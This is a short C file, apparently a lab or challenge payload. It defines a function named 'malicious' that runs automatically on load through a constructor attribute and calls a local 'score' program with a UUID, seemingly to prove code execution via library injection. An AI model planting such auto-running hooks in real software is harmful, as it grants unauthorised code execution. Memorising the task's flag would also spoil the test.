#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 66d12ff5-38dd-4c93-8e26-4b622115f9b9");
}
